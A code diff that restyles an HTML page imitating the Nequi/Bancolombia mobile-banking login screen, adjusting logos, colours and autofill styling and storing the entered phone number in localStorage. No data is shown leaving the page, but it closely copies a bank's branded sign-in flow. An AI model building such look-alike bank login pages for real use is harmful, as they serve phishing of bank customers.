@@ -22,60 +22,76 @@
       height: 100vh;
       display: flex;
       flex-direction: column;
+      background: linear-gradient(#2C0B3A, #1F0A2E);
     }
-    .header {
+
+    .top-bar {
       display: flex;
-      justify-content: flex-end;
-      padding: 15px 0;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 0 20px 0;
+    }
+    .bancolombia-logo {
+      font-size: 22px;
+      font-weight: 700;
+      color: #FF2D95;
     }
     .help {
-      width: 30px; height: 30px;
-      border: 2px solid white;
+      width: 28px; 
+      height: 28px;
+      border: 2px solid #FFFFFF;
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 18px;
-    }
-    .logo {
-      font-size: 52px;
-      font-weight: 700;
-      text-align: center;
-      margin: 80px 0 100px 0;
+      font-size: 17px;
       color: white;
     }
-    .logo span { color: #FF2D95; }
+
+    .nequi-logo {
+      text-align: center;
+      font-size: 54px;
+      font-weight: 700;
+      margin: 60px 0 90px 0;
+      color: white;
+    }
+    .nequi-logo span { color: #FF2D95; }
+
+    .label {
+      text-align: center;
+      font-size: 17px;
+      margin-bottom: 25px;
+      color: #E0C0FF;
+    }
 
     .input-wrapper {
-      background: rgba(255,255,255,0.1);
+      background: #2A1840;
+      border: 2px solid #2A1840;     /* Mismo color del centro */
       border-radius: 12px;
-      padding: 5px;
-      margin-bottom: 30px;
+      padding: 4px;
     }
+
     input {
       width: 100%;
-      background: #2A1840 !important;
-      color: white !important;
+      background: #2A1840;
+      color: white;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       padding: 18px 20px;
-      font-size: 17px;
+      font-size: 17.5px;
       outline: none;
     }
     input::placeholder {
-      color: #B8A0D0;
+      color: #B89ED4;
     }
 
-    /* === FIX FUERTE PARA EL FONDO BLANCO DEL AUTOCOMPLETADO === */
+    /* Fix fuerte para autocompletado */
     input:-webkit-autofill,
     input:-webkit-autofill:hover,
-    input:-webkit-autofill:focus,
-    input:-webkit-autofill:active {
+    input:-webkit-autofill:focus {
       -webkit-text-fill-color: white !important;
       -webkit-box-shadow: 0 0 0 30px #2A1840 inset !important;
-      box-shadow: 0 0 0 30px #2A1840 inset !important;
-      background: #2A1840 !important;
-      transition: background-color 5000s ease-in-out 0s;
+      background-color: #2A1840 !important;
     }
 
     button {
@@ -87,24 +103,23 @@
       border-radius: 12px;
       font-size: 17px;
       font-weight: 500;
-      box-shadow: 0 4px 15px rgba(255, 45, 149, 0.4);
+      box-shadow: 0 5px 15px rgba(255, 45, 149, 0.35);
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="header">
+    <div class="top-bar">
+      <div class="bancolombia-logo">bancolombia</div>
       <div class="help">?</div>
     </div>
+
+    <div class="nequi-logo">Nequi <span>■</span></div>
     
-    <div class="logo">Nequi <span>■</span></div>
-    
-    <div style="text-align:center; margin-bottom:20px; font-size:18px;">
-      Ingresa tu número de celular
-    </div>
+    <div class="label">Ingresa tu número de celular</div>
 
     <div class="input-wrapper">
-      <input type="tel" id="phone" placeholder="300 1234567" maxlength="10" inputmode="numeric">
+      <input type="tel" id="phone" placeholder="300 123 4567" maxlength="10" inputmode="numeric">
     </div>
 
     <button onclick="nextScreen()">Entra</button>
@@ -114,7 +129,7 @@
     function nextScreen() {
       const phone = document.getElementById("phone").value.trim();
       if (phone.length < 10) {
-        alert("Por favor ingresa un número válido");
+        alert("Por favor ingresa un número de celular válido");
         return;
       }
       localStorage.setItem("phone", phone);
